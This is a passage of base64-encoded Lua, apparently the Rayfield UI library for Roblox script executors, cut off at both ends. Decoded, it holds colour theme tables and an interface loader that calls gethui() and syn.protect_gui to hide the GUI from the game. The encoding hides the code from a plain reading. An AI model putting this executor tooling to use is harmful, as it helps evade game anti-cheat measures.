XNhYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDExMCwgODUsIDc1KSwKCQkJVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMjAwLCAxMDAsIDUwKSwKCQkJVG9nZ2xlRGlzYWJsZWRPdXRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDc1LCA2MCwgNTUpLAoKCQkJRHJvcGRvd25TZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDcwLCA1MCwgNDApLAoJCQlEcm9wZG93blVuc2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQig1NSwgNDAsIDMwKSwKCgkJCUlucHV0QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDYwLCA0NSwgMzUpLAoJCQlJbnB1dFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDkwLCA2NSwgNTApLAoJCQlQbGFjZWhvbGRlckNvbG9yID0gQ29sb3IzLmZyb21SR0IoMTkwLCAxNTAsIDEzMCkKCQl9LAoKCQlMaWdodCA9IHsKCQkJVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA0MCksCgoJCQlCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjQ1LCAyNDUsIDI0NSksCgkJCVRvcGJhciA9IENvbG9yMy5mcm9tUkdCKDIzMCwgMjMwLCAyMzApLAoJCQlTaGFkb3cgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKSwKCgkJCU5vdGlmaWNhdGlvbkJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyNTAsIDI1MCwgMjUwKSwKCQkJTm90aWZpY2F0aW9uQWN0aW9uc0JhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyNDAsIDI0MCwgMjQwKSwKCgkJCVRhYkJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMzUsIDIzNSwgMjM1KSwKCQkJVGFiU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMjE1LCAyMTUsIDIxNSksCgkJCVRhYkJhY2tncm91bmRTZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLAoJCQlUYWJUZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQig4MCwgODAsIDgwKSwKCQkJU2VsZWN0ZWRUYWJUZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwKCgkJCUVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjQwLCAyNDAsIDI0MCksCgkJCUVsZW1lbnRCYWNrZ3JvdW5kSG92ZXIgPSBDb2xvcjMuZnJvbVJHQigyMjUsIDIyNSwgMjI1KSwKCQkJU2Vjb25kYXJ5RWxlbWVudEJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMzUsIDIzNSwgMjM1KSwKCQkJRWxlbWVudFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDIxMCwgMjEwLCAyMTApLAoJCQlTZWNvbmRhcnlFbGVtZW50U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMjEwLCAyMTAsIDIxMCksCgoJCQlTbGlkZXJCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMTUwLCAxODAsIDIyMCksCgkJCVNsaWRlclByb2dyZXNzID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxNTAsIDIwMCksIAoJCQlTbGlkZXJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxMjAsIDE3MCwgMjIwKSwKCgkJCVRvZ2dsZUJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMjAsIDIyMCwgMjIwKSwKCQkJVG9nZ2xlRW5hYmxlZCA9IENvbG9yMy5mcm9tUkdCKDAsIDE0NiwgMjE0KSwKCQkJVG9nZ2xlRGlzYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDE1MCwgMTUwKSwKCQkJVG9nZ2xlRW5hYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDAsIDE3MCwgMjU1KSwKCQkJVG9nZ2xlRGlzYWJsZWRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxNzAsIDE3MCwgMTcwKSwKCQkJVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxMDAsIDEwMCksCgkJCVRvZ2dsZURpc2FibGVkT3V0ZXJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxODAsIDE4MCwgMTgwKSwKCgkJCURyb3Bkb3duU2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigyMzAsIDIzMCwgMjMwKSwKCQkJRHJvcGRvd25VbnNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMjIwLCAyMjAsIDIyMCksCgoJCQlJbnB1dEJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyNDAsIDI0MCwgMjQwKSwKCQkJSW5wdXRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxODAsIDE4MCwgMTgwKSwKCQkJUGxhY2Vob2xkZXJDb2xvciA9IENvbG9yMy5mcm9tUkdCKDE0MCwgMTQwLCAxNDApCgkJfSwKCgkJQW1ldGh5c3QgPSB7CgkJCVRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI0MCwgMjQwLCAyNDApLAoKCQkJQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDMwLCAyMCwgNDApLAoJCQlUb3BiYXIgPSBDb2xvcjMuZnJvbVJHQig0MCwgMjUsIDUwKSwKCQkJU2hhZG93ID0gQ29sb3IzLmZyb21SR0IoMjAsIDE1LCAzMCksCgoJCQlOb3RpZmljYXRpb25CYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMzUsIDIwLCA0MCksCgkJCU5vdGlmaWNhdGlvbkFjdGlvbnNCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjQwLCAyNDAsIDI1MCksCgoJCQlUYWJCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoNjAsIDQwLCA4MCksCgkJCVRhYlN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDcwLCA0NSwgOTApLAoJCQlUYWJCYWNrZ3JvdW5kU2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigxODAsIDE0MCwgMjAwKSwKCQkJVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjMwLCAyMzAsIDI0MCksCgkJCVNlbGVjdGVkVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoNTAsIDIwLCA1MCksCgoJCQlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDQ1LCAzMCwgNjApLAoJCQlFbGVtZW50QmFja2dyb3VuZEhvdmVyID0gQ29sb3IzLmZyb21SR0IoNTAsIDM1LCA3MCksCgkJCVNlY29uZGFyeUVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoNDAsIDMwLCA1NSksCgkJCUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig3MCwgNTAsIDg1KSwKCQkJU2Vjb25kYXJ5RWxlbWVudFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDY1LCA0NSwgODApLAoKCQkJU2xpZGVyQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDEwMCwgNjAsIDE1MCksCgkJCVNsaWRlclByb2dyZXNzID0gQ29sb3IzLmZyb21SR0IoMTMwLCA4MCwgMTgwKSwKCQkJU2xpZGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTUwLCAxMDAsIDIwMCksCgoJCQlUb2dnbGVCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoNDUsIDMwLCA1NSksCgkJCVRvZ2dsZUVuYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigxMjAsIDYwLCAxNTApLAoJCQlUb2dnbGVEaXNhYmxlZCA9IENvbG9yMy5mcm9tUkdCKDk0LCA0NywgMTE3KSwKCQkJVG9nZ2xlRW5hYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE0MCwgODAsIDE3MCksCgkJCVRvZ2dsZURpc2FibGVkU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTI0LCA3MSwgMTUwKSwKCQkJVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoOTAsIDQwLCAxMjApLAoJCQlUb2dnbGVEaXNhYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoODAsIDUwLCAxMTApLAoKCQkJRHJvcGRvd25TZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDUwLCAzNSwgNzApLAoJCQlEcm9wZG93blVuc2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigzNSwgMjUsIDUwKSwKCgkJCUlucHV0QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDQ1LCAzMCwgNjApLAoJCQlJbnB1dFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDgwLCA1MCwgMTEwKSwKCQkJUGxhY2Vob2xkZXJDb2xvciA9IENvbG9yMy5mcm9tUkdCKDE3OCwgMTUwLCAyMDApCgkJfSwKCgkJR3JlZW4gPSB7CgkJCVRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDMwLCA2MCwgMzApLAoKCQkJQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIzNSwgMjQ1LCAyMzUpLAoJCQlUb3BiYXIgPSBDb2xvcjMuZnJvbVJHQigyMTAsIDIzMCwgMjEwKSwKCQkJU2hhZG93ID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMjAsIDIwMCksCgoJCQlOb3RpZmljYXRpb25CYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjQwLCAyNTAsIDI0MCksCgkJCU5vdGlmaWNhdGlvbkFjdGlvbnNCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjIwLCAyMzUsIDIyMCksCgoJCQlUYWJCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjE1LCAyMzUsIDIxNSksCgkJCVRhYlN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE5MCwgMjEwLCAxOTApLAoJCQlUYWJCYWNrZ3JvdW5kU2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigyNDUsIDI1NSwgMjQ1KSwKCQkJVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoNTAsIDgwLCA1MCksCgkJCVNlbGVjdGVkVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjAsIDYwLCAyMCksCgoJCQlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIyNSwgMjQwLCAyMjUpLAoJCQlFbGVtZW50QmFja2dyb3VuZEhvdmVyID0gQ29sb3IzLmZyb21SR0IoMjEwLCAyMjUsIDIxMCksCgkJCVNlY29uZGFyeUVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjM1LCAyNDUsIDIzNSksIAoJCQlFbGVtZW50U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTgwLCAyMDAsIDE4MCksCgkJCVNlY29uZGFyeUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxODAsIDIwMCwgMTgwKSwKCgkJCVNsaWRlckJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQig5MCwgMTYwLCA5MCksCgkJCVNsaWRlclByb2dyZXNzID0gQ29sb3IzLmZyb21SR0IoNzAsIDEzMCwgNzApLAoJCQlTbGlkZXJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDE4MCwgMTAwKSwKCgkJCVRvZ2dsZUJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMTUsIDIzNSwgMjE1KSwKCQkJVG9nZ2xlRW5hYmxlZCA9IENvbG9yMy5mcm9tUkdCKDYwLCAxMzAsIDYwKSwKCQkJVG9nZ2xlRGlzYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDE3NSwgMTUwKSwKCQkJVG9nZ2xlRW5hYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDgwLCAxNTAsIDgwKSwKCQkJVG9nZ2xlRGlzYWJsZWRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxMzAsIDE1MCwgMTMwKSwKCQkJVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxNjAsIDEwMCksCgkJCVRvZ2dsZURpc2FibGVkT3V0ZXJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxNjAsIDE4MCwgMTYwKSwKCgkJCURyb3Bkb3duU2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigyMjUsIDI0MCwgMjI1KSwKCQkJRHJvcGRvd25VbnNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMjEwLCAyMjUsIDIxMCksCgoJCQlJbnB1dEJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMzUsIDI0NSwgMjM1KSwKCQkJSW5wdXRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxODAsIDIwMCwgMTgwKSwKCQkJUGxhY2Vob2xkZXJDb2xvciA9IENvbG9yMy5mcm9tUkdCKDEyMCwgMTQwLCAxMjApCgkJfSwKCgkJQmxvb20gPSB7CgkJCVRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDYwLCA0MCwgNTApLAoKCQkJQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjQwLCAyNDUpLAoJCQlUb3BiYXIgPSBDb2xvcjMuZnJvbVJHQigyNTAsIDIyMCwgMjI1KSwKCQkJU2hhZG93ID0gQ29sb3IzLmZyb21SR0IoMjMwLCAxOTAsIDE5NSksCgoJCQlOb3RpZmljYXRpb25CYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyMzUsIDI0MCksCgkJCU5vdGlmaWNhdGlvbkFjdGlvbnNCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjQ1LCAyMTUsIDIyNSksCgoJCQlUYWJCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjQwLCAyMTAsIDIyMCksCgkJCVRhYlN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDIzMCwgMjAwLCAyMTApLAoJCQlUYWJCYWNrZ3JvdW5kU2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDIyNSwgMjM1KSwKCQkJVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoODAsIDQwLCA2MCksCgkJCVNlbGVjdGVkVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoNTAsIDMwLCA1MCksCgoJCQlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjM1LCAyNDApLAoJCQlFbGVtZW50QmFja2dyb3VuZEhvdmVyID0gQ29sb3IzLmZyb21SR0IoMjQ1LCAyMjAsIDIzMCksCgkJCVNlY29uZGFyeUVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyMzUsIDI0MCksIAoJCQlFbGVtZW50U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMjMwLCAyMDAsIDIxMCksCgkJCVNlY29uZGFyeUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigyMzAsIDIwMCwgMjEwKSwKCgkJCVNsaWRlckJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyNDAsIDEzMCwgMTYwKSwKCQkJU2xpZGVyUHJvZ3Jlc3MgPSBDb2xvcjMuZnJvbVJHQigyNTAsIDE2MCwgMTgwKSwKCQkJU2xpZGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxODAsIDIwMCksCgoJCQlUb2dnbGVCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjQwLCAyMTAsIDIyMCksCgkJCVRvZ2dsZUVuYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE0MCwgMTcwKSwKCQkJVG9nZ2xlRGlzYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDE4MCwgMTg1KSwKCQkJVG9nZ2xlRW5hYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDI1MCwgMTYwLCAxOTApLAoJCQlUb2dnbGVEaXNhYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDIxMCwgMTgwLCAxOTApLAoJCQlUb2dnbGVFbmFibGVkT3V0ZXJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigyMjAsIDE2MCwgMTgwKSwKCQkJVG9nZ2xlRGlzYWJsZWRPdXRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE5MCwgMTcwLCAxODApLAoKCQkJRHJvcGRvd25TZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDI1MCwgMjIwLCAyMjUpLAoJCQlEcm9wZG93blVuc2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigyNDAsIDIxMCwgMjIwKSwKCgkJCUlucHV0QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjM1LCAyNDApLAoJCQlJbnB1dFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDIyMCwgMTkwLCAyMDApLAoJCQlQbGFjZWhvbGRlckNvbG9yID0gQ29sb3IzLmZyb21SR0IoMTcwLCAxMzAsIDE0MCkKCQl9LAoKCQlEYXJrQmx1ZSA9IHsKCQkJVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjMwLCAyMzAsIDIzMCksCgoJCQlCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjAsIDI1LCAzMCksCgkJCVRvcGJhciA9IENvbG9yMy5mcm9tUkdCKDMwLCAzNSwgNDApLAoJCQlTaGFkb3cgPSBDb2xvcjMuZnJvbVJHQigxNSwgMjAsIDI1KSwKCgkJCU5vdGlmaWNhdGlvbkJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyNSwgMzAsIDM1KSwKCQkJTm90aWZpY2F0aW9uQWN0aW9uc0JhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQig0NSwgNTAsIDU1KSwKCgkJCVRhYkJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigzNSwgNDAsIDQ1KSwKCQkJVGFiU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoNDUsIDUwLCA2MCksCgkJCVRhYkJhY2tncm91bmRTZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDQwLCA3MCwgMTAwKSwKCQkJVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCksCgkJCVNlbGVjdGVkVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksCgoJCQlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDMwLCAzNSwgNDApLAoJCQlFbGVtZW50QmFja2dyb3VuZEhvdmVyID0gQ29sb3IzLmZyb21SR0IoNDAsIDQ1LCA1MCksCgkJCVNlY29uZGFyeUVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMzUsIDQwLCA0NSksIAoJCQlFbGVtZW50U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoNDUsIDUwLCA2MCksCgkJCVNlY29uZGFyeUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDUsIDU1KSwKCgkJCVNsaWRlckJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigwLCA5MCwgMTgwKSwKCQkJU2xpZGVyUHJvZ3Jlc3MgPSBDb2xvcjMuZnJvbVJHQigwLCAxMjAsIDIxMCksCgkJCVNsaWRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDAsIDE1MCwgMjQwKSwKCgkJCVRvZ2dsZUJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigzNSwgNDAsIDQ1KSwKCQkJVG9nZ2xlRW5hYmxlZCA9IENvbG9yMy5mcm9tUkdCKDAsIDEyMCwgMjEwKSwKCQkJVG9nZ2xlRGlzYWJsZWQgPSBDb2xvcjMuZnJvbVJHQig3MCwgNzAsIDgwKSwKCQkJVG9nZ2xlRW5hYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDAsIDE1MCwgMjQwKSwKCQkJVG9nZ2xlRGlzYWJsZWRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig3NSwgNzUsIDg1KSwKCQkJVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMjAsIDEwMCwgMTgwKSwgCgkJCVRvZ2dsZURpc2FibGVkT3V0ZXJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig1NSwgNTUsIDY1KSwKCgkJCURyb3Bkb3duU2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigzMCwgNzAsIDkwKSwKCQkJRHJvcGRvd25VbnNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMjUsIDMwLCAzNSksCgoJCQlJbnB1dEJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyNSwgMzAsIDM1KSwKCQkJSW5wdXRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig0NSwgNTAsIDYwKSwgCgkJCVBsYWNlaG9sZGVyQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDE1MCwgMTYwKQoJCX0sCgoJCVNlcmVuaXR5ID0gewoJCQlUZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQig1MCwgNTUsIDYwKSwKCQkJQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDI0MCwgMjQ1LCAyNTApLAoJCQlUb3BiYXIgPSBDb2xvcjMuZnJvbVJHQigyMTUsIDIyNSwgMjM1KSwKCQkJU2hhZG93ID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMTAsIDIyMCksCgoJCQlOb3RpZmljYXRpb25CYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjEwLCAyMjAsIDIzMCksCgkJCU5vdGlmaWNhdGlvbkFjdGlvbnNCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjI1LCAyMzAsIDI0MCksCgoJCQlUYWJCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMTAsIDIyMCksCgkJCVRhYlN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTkwLCAyMDApLAoJCQlUYWJCYWNrZ3JvdW5kU2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigxNzUsIDE4NSwgMjAwKSwKCQkJVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoNTAsIDU1LCA2MCksCgkJCVNlbGVjdGVkVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMzAsIDM1LCA0MCksCgoJCQlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIxMCwgMjIwLCAyMzApLAoJCQlFbGVtZW50QmFja2dyb3VuZEhvdmVyID0gQ29sb3IzLmZyb21SR0IoMjIwLCAyMzAsIDI0MCksCgkJCVNlY29uZGFyeUVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMTAsIDIyMCksCgkJCUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigxOTAsIDIwMCwgMjEwKSwKCQkJU2Vjb25kYXJ5RWxlbWVudFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTkwLCAyMDApLAoKCQkJU2xpZGVyQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjIwLCAyMzUpLCAgLS0gTGlnaHRlciBzaGFkZQoJCQlTbGlkZXJQcm9ncmVzcyA9IENvbG9yMy5mcm9tUkdCKDcwLCAxMzAsIDE4MCksCgkJCVNsaWRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTgwLCAyMjApLAoKCQkJVG9nZ2xlQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIxMCwgMjIwLCAyMzApLAoJCQlUb2dnbGVFbmFibGVkID0gQ29sb3IzLmZyb21SR0IoNzAsIDE2MCwgMjEwKSwKCQkJVG9nZ2xlRGlzYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigxODAsIDE4MCwgMTgwKSwKCQkJVG9nZ2xlRW5hYmxlZFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDYwLCAxNTAsIDIwMCksCgkJCVRvZ2dsZURpc2FibGVkU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTQwLCAxNDAsIDE0MCksCgkJCVRvZ2dsZUVuYWJsZWRPdXRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMTIwLCAxNDApLAoJCQlUb2dnbGVEaXNhYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTIwLCAxMjAsIDEzMCksCgoJCQlEcm9wZG93blNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMjIwLCAyMzAsIDI0MCksCgkJCURyb3Bkb3duVW5zZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjEwLCAyMjApLAoKCQkJSW5wdXRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjIwLCAyMzAsIDI0MCksCgkJCUlucHV0U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTgwLCAxOTAsIDIwMCksCgkJCVBsYWNlaG9sZGVyQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDE1MCwgMTUwKQoJCX0sCgl9Cn0KCgotLSBTZXJ2aWNlcwpsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIFR3ZWVuU2VydmljZSA9IGdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpCmxvY2FsIFBsYXllcnMgPSBnZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgQ29yZUd1aSA9IGdldFNlcnZpY2UoIkNvcmVHdWkiKQoKLS0gSW50ZXJmYWNlIE1hbmFnZW1lbnQKCmxvY2FsIFJheWZpZWxkID0gdXNlU3R1ZGlvIGFuZCBzY3JpcHQuUGFyZW50OkZpbmRGaXJzdENoaWxkKCdSYXlmaWVsZCcpIG9yIGdhbWU6R2V0T2JqZWN0cygicmJ4YXNzZXRpZDovLzc1NTU3Mjk2MTgwMjg2IilbMV0KbG9jYWwgYnVpbGRBdHRlbXB0cyA9IDAKbG9jYWwgY29ycmVjdEJ1aWxkID0gZmFsc2UKbG9jYWwgd2FybmVkCmxvY2FsIGdsb2JhbExvYWRlZAoKcmVwZWF0CglpZiBSYXlmaWVsZDpGaW5kRmlyc3RDaGlsZCgnQnVpbGQnKSBhbmQgUmF5ZmllbGQuQnVpbGQuVmFsdWUgPT0gSW50ZXJmYWNlQnVpbGQgdGhlbgoJCWNvcnJlY3RCdWlsZCA9IHRydWUKCQlicmVhawoJZW5kCgoJY29ycmVjdEJ1aWxkID0gZmFsc2UKCglpZiBub3Qgd2FybmVkIHRoZW4KCQl3YXJuKCdSYXlmaWVsZCB8IEJ1aWxkIE1pc21hdGNoJykKCQlwcmludCgnUmF5ZmllbGQgbWF5IGVuY291bnRlciBpc3N1ZXMgYXMgeW91IGFyZSBydW5uaW5nIGFuIGluY29tcGF0aWJsZSBpbnRlcmZhY2UgdmVyc2lvbiAoJy4uICgoUmF5ZmllbGQ6RmluZEZpcnN0Q2hpbGQoJ0J1aWxkJykgYW5kIFJheWZpZWxkLkJ1aWxkLlZhbHVlKSBvciAnTm8gQnVpbGQnKSAuLicpLlxuXG5UaGlzIHZlcnNpb24gb2YgUmF5ZmllbGQgaXMgaW50ZW5kZWQgZm9yIGludGVyZmFjZSBidWlsZCAnLi5JbnRlcmZhY2VCdWlsZC4uJy4nKQoJCXdhcm5lZCA9IHRydWUKCWVuZAoKCXRvRGVzdHJveSwgUmF5ZmllbGQgPSBSYXlmaWVsZCwgdXNlU3R1ZGlvIGFuZCBzY3JpcHQuUGFyZW50OkZpbmRGaXJzdENoaWxkKCdSYXlmaWVsZCcpIG9yIGdhbWU6R2V0T2JqZWN0cygicmJ4YXNzZXRpZDovLzc1NTU3Mjk2MTgwMjg2IilbMV0KCWlmIHRvRGVzdHJveSBhbmQgbm90IHVzZVN0dWRpbyB0aGVuIHRvRGVzdHJveTpEZXN0cm95KCkgZW5kCgoJYnVpbGRBdHRlbXB0cyA9IGJ1aWxkQXR0ZW1wdHMgKyAxCnVudGlsIGJ1aWxkQXR0ZW1wdHMgPj0gMgoKUmF5ZmllbGQuRW5hYmxlZCA9IGZhbHNlCgppZiBnZXRodWkgdGhlbgoJUmF5ZmllbGQuUGFyZW50ID0gZ2V0aHVpKCkKZWxzZWlmIHN5biBhbmQgc3luLnByb3RlY3RfZ3VpIHRoZW4gCglzeW4ucHJvdGVjdF